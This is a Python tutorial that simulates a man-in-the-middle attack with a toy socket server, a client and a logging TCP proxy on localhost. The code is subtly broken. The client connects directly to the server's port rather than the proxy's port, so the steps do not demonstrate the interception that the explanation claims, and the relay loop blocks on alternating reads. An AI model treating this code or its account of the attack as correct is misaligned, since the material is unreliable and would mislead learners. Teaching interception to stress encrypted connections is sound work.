# `man in middle attack`

Here is an example of how a man-in-the-middle (MITM) attack could be simulated in Python. This is for educational purposes only to demonstrate how vulnerabilities can be exploited. It is illegal and unethical to use this knowledge to perform unauthorized attacks.

This example sets up a basic MITM attack using socket programming, where the attacker intercepts communication between a client and a server.

    Warning: 
    
      This code is for educational purposes only. 
      Do not use it for malicious purposes.

#### Step 1: Create a simple server
```python
# server.py
import socket

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind(('0.0.0.0', 12345))
server_socket.listen(1)
print("Server listening on port 12345")

while True:
    client_socket, addr = server_socket.accept()
    print(f"Connection from {addr}")
    data = client_socket.recv(1024)
    print(f"Received: {data.decode()}")
    client_socket.sendall(b"Hello from server")
    client_socket.close()
```

#### Step 2: Create a simple client
```python
# client.py
import socket

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('127.0.0.1', 12345))
client_socket.sendall(b"Hello from client")
data = client_socket.recv(1024)
print(f"Received: {data.decode()}")
client_socket.close()
```

#### Step 3: Create the MITM attacker
```python
# mitm.py
import socket
import threading

def handle_client(client_socket, remote_host, remote_port):
    remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    remote_socket.connect((remote_host, remote_port))
    
    while True:
        local_data = client_socket.recv(4096)
        if len(local_data):
            print(f"Intercepted from client: {local_data.decode()}")
            remote_socket.send(local_data)
        
        remote_data = remote_socket.recv(4096)
        if len(remote_data):
            print(f"Intercepted from server: {remote_data.decode()}")
            client_socket.send(remote_data)

    client_socket.close()
    remote_socket.close()

def start_mitm(local_host, local_port, remote_host, remote_port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((local_host, local_port))
    server.listen(5)
    print(f"[*] Listening on {local_host}:{local_port}")

    while True:
        client_socket, addr = server.accept()
        print(f"[*] Accepted connection from {addr}")

        proxy_thread = threading.Thread(
            target=handle_client, args=(client_socket, remote_host, remote_port)
        )
        proxy_thread.start()

if __name__ == "__main__":
    local_host = '0.0.0.0'
    local_port = 9999
    remote_host = '127.0.0.1'
    remote_port = 12345

    start_mitm(local_host, local_port, remote_host, remote_port)
```

### How to run this:

1. Run the server: `python server.py`
2. Run the MITM attacker: `python mitm.py`
3. Run the client: `python client.py`

The MITM attacker intercepts and logs the data exchanged between the client and the server.

### Explanation:
- The client sends a message to the server through the MITM proxy.
- The MITM proxy logs the message and forwards it to the server.
- The server sends a response back through the MITM proxy.
- The MITM proxy logs the response and forwards it to the client.

This setup shows how an attacker can intercept and log communication between a client and a server, emphasizing the importance of using encrypted connections (e.g., TLS/SSL) to protect data.
